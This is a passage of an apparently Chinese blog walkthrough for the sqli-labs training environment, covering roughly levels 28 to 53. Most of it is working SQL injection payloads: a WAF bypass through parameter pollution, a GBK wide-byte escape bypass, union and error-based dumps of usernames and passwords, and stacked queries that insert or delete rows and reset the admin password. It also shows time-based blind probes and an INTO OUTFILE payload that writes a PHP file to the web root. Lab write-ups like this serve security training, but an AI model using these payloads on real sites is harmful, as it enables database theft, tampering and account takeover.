class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=&#x27;users&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)%0buniOn%0bsElEct%0b1,(group_concat(username,0x7e,password)),3%0bfrom%0busers%0bwhere%0b(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure></li></ol><ul><li>第28a关<br>与28关相比，只是过滤条件少了几个</li></ul><h2 id="29-31-绕过WAF的联合注入"><a href="#29-31-绕过WAF的联合注入" class="headerlink" title="29-31(绕过WAF的联合注入)"></a>29-31(绕过WAF的联合注入)</h2><ol><li><p>测试并判断注入类型<br>先进行常规操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+  出现报错</span><br><span class="line">?id=-1&#x27;union select 1,2,3 --+  爆出显示位</span><br></pre></td></tr></table></figure><p>但当我们进入login.php页面，再继续注入时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login.php?id=1&#x27; --+</span><br></pre></td></tr></table></figure><p>页面跳转<br><img src="/simg/sqli-labs_29.png" alt="显示"><br>这里是部署了WAF<br>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。<br>详细解释：<a href="https://baike.baidu.com/item/WAF/3239498">WAF</a><br>第一个参数被WAF所检查，但第二个参数不会，因此我们可以加入第二个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=2</span><br></pre></td></tr></table></figure></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=2&#x27; order by 4 --+</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),3 from users --+</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>第30关<br>与第29关差不多，只是闭合方式从’变更为”</p></li><li><p>第31关<br>与第29关差不多，只是闭合方式从”变更为”)</p></li></ul><h2 id="32-33-GET方式的宽字节注入"><a href="#32-33-GET方式的宽字节注入" class="headerlink" title="32-33(GET方式的宽字节注入)"></a>32-33(GET方式的宽字节注入)</h2><ol><li>测试并判断注入类型<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;  发现被转义为了 1\&#x27;</span><br></pre></td></tr></table></figure>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>复习一下，<br>preg_replace()函数执行一个正则表达式的搜索和替换。详细：<a href="https://www.runoob.com/php/php-preg_replace.html">PHP preg_replace() 函数</a><br>preg_quote()函数用于转义正则表达式字符。详细：<a href="https://www.runoob.com/php/php-preg_quote.html">PHP preg_quote() 函数</a><br>因此，我们无法用单引号双引号闭合注入<br>但源码中还有一句引起了注意：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot;SET NAMES gbk&quot;);</span><br></pre></td></tr></table></figure>这里表明是使用gbk编码，那么我们可以尝试使用宽字节注入。</li></ol><ul><li>当某字符的大小为一个字节时，称其字符为窄字节.</li><li>当某字符的大小为两个字节时，称其字符为宽字节.</li><li>所有英文默认占一个字节，汉字占两个字节</li><li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等<br>宽字节的格式是在地址后先加一个%df，再加单引号，因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字“連”，所以这时，单引号成功逃逸。<br>宽字节注入情况：</li><li>客户端、连接层、结果集 都是GBK编码</li><li>使用iconv进行字符集转换，将UTF-8转为GBK，同时，set names字符集为GBK。提交%e9%8c%a6即可。</li><li>使用set names UTF-8指定了UTF-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用iconv函数（或者mb_convert_encoding）先转为UTF-8，然后再拼接入SQL语句。</li></ul><p>注意：<br>页面默认是utf-8，如果想看显示效果需要更改页面编码，我这里是用到了chrome的扩展商店的插件，具体可看下面这篇文章<br><a href="https://www.munue.com/172.html#:~:text=%E5%8F%B3%E9%94%AE%E7%82%B9%E5%87%BB%E5%9B%BE%E6%A0%87%EF%BC%8C%E6%89%93%E5%BC%80%E9%80%89%E9%A1%B9,%E8%BF%9B%E8%A1%8C%E9%80%89%E6%8B%A9%E5%92%8C%E8%AE%BE%E7%BD%AE%E7%BC%96%E7%A0%81%E3%80%82">Google Chrome 浏览器如何设置网页编码</a></p><p>最终，我们构造该语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure><p>页面显示效果如下<br><img src="/simg/sqli-labs_32.png" alt="显示效果"></p><ol start="2"><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27;order by 4 --+</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(0x7e,id,0x7e,username,0x7e,password) from users) --+</span><br></pre></td></tr></table></figure></li></ol><ul><li>第33关<br>和第32关本质是一样的，只是源码用了addslashes()函数<br>addslashes()函数：addslashes() 函数返回在预定义的字符前添加反斜杠的字符串<br>预定义字符是：</li><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL<br>注入方式相同，这里不再重复</li></ul><h2 id="34-POST方式的宽字节注入"><a href="#34-POST方式的宽字节注入" class="headerlink" title="34(POST方式的宽字节注入)"></a>34(POST方式的宽字节注入)</h2><p>有两种方案：</p><ul><li>第1种</li></ul><ol><li><p>测试并判断注入类型<br>和之前的32，33关差别不大，但是这回是POST提交方式<br>因为在url栏中输入 %df 主要是以 16进制形式输入，而在输入框输入 %df 则是以普通字符串输入的。<br>所以我们需要略作改变<br>绕过方法：有些汉字的编码为三个字节的编码，我们将三个字节拆开来看，前两个为一组，后面的那个和 \ 相编码为两字节绕过，从而使得单引号逃逸</p></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; order by 3 #</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li></ol><ul><li>第2种</li></ul><ol><li><p>测试并判断注入类型<br>既然在输入栏不能直接输入，我们可以通过burp抓包来注入。</p></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; order by 3 #</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; union select 1,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li></ol><ul><li>burp注入的另一种方案，在Hex栏修改16进制注入为df。<br>可参见：<a href="https://blog.csdn.net/m0_62879498/article/details/122558222">sql-lab (32~35)包含对 宽字节注入的原理理解及注意事项</a><br>虽然不算很实用的方法，但也不失为一种有趣的思路。</li></ul><h2 id="35-数字型的联合注入"><a href="#35-数字型的联合注入" class="headerlink" title="35(数字型的联合注入)"></a>35(数字型的联合注入)</h2><ol><li><p>测试并判断注入类型<br>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>通过这段源码，我们可以知道，id没有被单引号括起来所以addslashes起不到作用<br>直接payload即可</p></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 4 --+</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,version(),database() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li></ol><h2 id="36-37-宽字节注入"><a href="#36-37-宽字节注入" class="headerlink" title="36-37(宽字节注入)"></a>36-37(宽字节注入)</h2><ol><li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>我们可以注意到这里有个mysql_real_escape_string()函数<br>下列字符受影响：</li></ol><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>’</li><li>“</li><li>\x1a<br>那么直接用%df绕过</li></ul><ol start="2"><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27; order by 4 --+</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure></li></ol><ul><li>第37关<br>和第34关差不多，这一关网上有说按第34关第1种方法能成功，但我没成功<br>因此我选择第2种，使用burp抓包注入。</li></ul><h2 id="38-41-堆叠注入"><a href="#38-41-堆叠注入" class="headerlink" title="38-41(堆叠注入)"></a>38-41(堆叠注入)</h2><ol><li>测试并判断注入类型<br>首先查看源码，发现这样一条语句<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)</span><br></pre></td></tr></table></figure>mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用分号分隔的SQL语句。<br>详细可见：<a href="https://www.php.net/manual/zh/mysqli.multi-query.php#:~:text=mysqli_multi_query%20%28mysqli%20%24link%2C%20string%20%24query%29%3A%20bool%20%E6%89%A7%E8%A1%8C%E4%B8%80%E4%B8%AA%20SQL,%E8%AF%AD%E5%8F%A5%E3%80%82%20%E8%A6%81%E8%8E%B7%E5%BE%97%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%BB%93%E6%9E%9C%E9%9B%86%EF%BC%8C%E8%AF%B7%E4%BD%BF%E7%94%A8%20mysqli_use_result%20%28%29%20%E6%88%96%20mysqli_store_result%20%28%29%20%E5%87%BD%E6%95%B0%E3%80%82">mysqli_multi_query</a></li></ol><p>那么，当我们看到这条语句时，就可以注意能否使用<strong>堆叠注入</strong>了。<br>所谓堆叠注入，简单地说，是能够同时注入多条语句。<br>实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p><ol start="2"><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure></li><li><p>增删改<br>这里示例一个增，也即为插入数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; ;insert into users(id,username,password)values(100,&#x27;772211&#x27;,&#x27;112277&#x27;);</span><br><span class="line">?id=100</span><br></pre></td></tr></table></figure><p>先后输入这两条语句，可以看到插入成功<br>示例一个删</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) ;delete from users where id=1;</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>第39关<br>与第38关相比差不多，只不过第39关不需要单引号</p></li><li><p>第40关<br>与第38关相比差不多，只不过第40关的闭合方式是’)</p></li><li><p>第41关<br>与38关差不多，也可堆叠注入</p></li></ul><h2 id="42-45-联合注入或堆叠注入"><a href="#42-45-联合注入或堆叠注入" class="headerlink" title="42-45(联合注入或堆叠注入)"></a>42-45(联合注入或堆叠注入)</h2><ol><li><p>测试并判断注入类型<br>查看源码，在login.php中注意到这样的语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure><p>我们可以发现，username被过滤了，但是password没有被过滤<br>因此我们可以考虑从password处进行注入<br>然后，通过对堆叠注入的尝试，我们发现也是可行的。<br>于是，我们可以有两种方式。<br>一是常规方式，二是通过堆叠注入修改管理员密码从而登录</p></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),2 from users #</span><br></pre></td></tr></table></figure></li><li><p>修改管理员密码(可以直接做)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;update users set password=&#x27;111111&#x27;  where username=&#x27;admin&#x27;#</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>第43关<br>与第42关差不多，只不过闭合方式为’)</p></li><li><p>第44关<br>与第42关差不多，只是不能使用报错注入</p></li><li><p>第45关<br>与第43关差不多，只是闭合方式为’)</p></li></ul><h2 id="46-47-报错注入和读写文件"><a href="#46-47-报错注入和读写文件" class="headerlink" title="46-47(报错注入和读写文件)"></a>46-47(报错注入和读写文件)</h2><ol><li><p>测试并判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1</span><br></pre></td></tr></table></figure><p>显示有id,username,password的表格<br>可以直接得到需要的信息，但在实际情况中，这样是不够的。<br>也可以倒序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 desc</span><br></pre></td></tr></table></figure><p>这里可用的注入方式很多<br>报错注入，时间盲注，双查询注入，函数注入<br>下面以报错注入为例</p></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br><span class="line">?sort=-1 and updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select concat_ws(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p>写入查询记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-46\\111.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure><p>用十六进制代替<?php phphinfo();?></p></li></ol><ul><li>第47关<br>与第46关相比差不多，只是闭合方式为’</li></ul><h2 id="48-53-布尔盲注"><a href="#48-53-布尔盲注" class="headerlink" title="48-53(布尔盲注)"></a>48-53(布尔盲注)</h2><ol><li><p>测试并判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;   无信息，只知道出错</span><br></pre></td></tr></table></figure><p>可以发现，现在无法使用报错注入了<br>那我们就要用到久违的盲注了。</p></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and if((ascii(substr(database(),1,1))=115),sleep(10),1) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database()) 